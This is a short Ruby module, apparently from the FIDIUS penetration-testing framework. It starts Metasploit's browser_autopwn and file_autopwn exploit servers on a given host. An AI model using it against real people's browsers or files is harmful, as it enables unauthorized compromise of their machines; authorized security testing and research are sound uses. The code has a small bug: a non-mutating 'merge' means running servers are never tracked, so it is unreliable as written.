module FIDIUS
  module Action
    module Exploit
      class Passive
        include Singleton

        def initialize
          @running = {}
        end

        def start_browser_autopwn lhost
          start_passive_exploit("server/browser_autopwn", lhost, '/')
        end

        def start_file_autopwn lhost
          start_passive_exploit("server/file_autopwn", lhost, 'file')
        end

        def running_actions
          @running
        end

private

        def start_passive_exploit(auxiliary, lhost, path)
          key = "#{lhost}#{path}".sub("//", "/")
          @running.merge({key => auxiliary})
          options = {'LHOST' => lhost, 'SRVHOST' => lhost, 'URIPATH' => path }
          FIDIUS::Action::Msf.instance.run_auxiliary(auxiliary, options)
        end

      end # class Passive
    end # module Exploit
  end # module Action
end # module FIDIUS

